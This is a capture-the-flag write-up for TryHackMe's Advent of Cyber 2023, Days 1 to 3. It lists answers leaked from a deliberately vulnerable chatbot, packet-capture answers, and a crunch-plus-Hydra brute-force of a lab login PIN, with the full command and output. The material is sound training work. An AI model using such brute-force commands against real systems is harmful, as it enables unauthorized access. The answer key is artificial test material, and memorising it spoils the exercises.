---
title: Advent of Cyber 2023
author: CYB3RM3
name: CYB3RM3 | Advent of Cyber 2023
date: 2023-12-04 11:41:21 +0100
categories: [TryHackMe, AdventOfCyber]
tags: ["2023", AOC]
---

Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

THM Room : [https://tryhackme.com/room/adventofcyber2023](https://tryhackme.com/room/adventofcyber2023)

## TASK 7 [Day 1] Machine learning Chatbot, tell me, if you're really safe?
### What is McGreedy's personal email address?
<!-- 

![McGreedy's Email](/images/thm/adventofcyber2023/adventofcyber2023_2.png)
_McGreedy's Email_

Answer : t.mcgreedy@antarcticrafts.thm

### What is the password for the IT server room door?

![Password IT door](/images/thm/adventofcyber2023/adventofcyber2023_3.png)
_Password IT door_

Answer : BtY2S02

### What is the name of McGreedy's secret project?

![McGreedy's secret project](/images/thm/adventofcyber2023/adventofcyber2023_1.png)
_McGreedy's secret project_

Answer : Purple Snow

### If you enjoyed this room, we invite you to join our Discord server for ongoing support, exclusive tips, and a community of peers to enhance your Advent of Cyber experience!

No Answer.

## TASK 8 [Day 2] Log analysis O Data, All Ye Faithful
### Open the notebook "Workbook" located in the directory "4_Capstone" on the VM. Use what you have learned today to analyse the packet capture.

No Answer.

### How many packets were captured (looking at the PacketNumber)?

![Number Packets](/images/thm/adventofcyber2023/adventofcyber2023_4.png)
_Number Packets_

Answer : 100

### What IP address sent the most amount of traffic during the packet capture?

![IP](/images/thm/adventofcyber2023/adventofcyber2023_5.png)
_IP_

Answer : 10.10.1.4

### What was the most frequent protocol?

![Protocol](/images/thm/adventofcyber2023/adventofcyber2023_6.png)
_Protocol_

Answer : ICMP

### If you enjoyed today's task, check out the Intro to Log Analysis room.
No Answer.

## TASK 9 [Day 3] Brute-forcing Hydra is Coming to Town 

![Door locked](/images/thm/adventofcyber2023/adventofcyber2023_7.png)
_Door locked_

We can generate a file with all combination "0123456789ABCDEF" with "crunch" :

```console
root@ip-10-10-164-200:~# crunch 3 3 0123456789ABCDEF -o 3digit.txt
Crunch will now generate the following amount of data: 16384 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 4096 

crunch: 100% completed generating output
root@ip-10-10-164-200:~# ls
3digit.txt 
```
{: .nolineno }

Once done, we can use Hydra to crack the passcode :

```console
hydra -l '' -P 3digit.txt -f -v 10.10.244.212 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000

[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[...]
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[VERBOSE] Page redirected to http://10.10.244.212:8000/error.php
[8000][http-post-form] host: 10.10.244.212   password: 6F5
[STATUS] attack finished for 10.10.244.212 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-04 11:38:34
```
{: .nolineno }

Testing the found password on the door : 

![Code](/images/thm/adventofcyber2023/adventofcyber2023_8.png)
_code_

![Flag](/images/thm/adventofcyber2023/adventofcyber2023_9.png)
_flag_ -->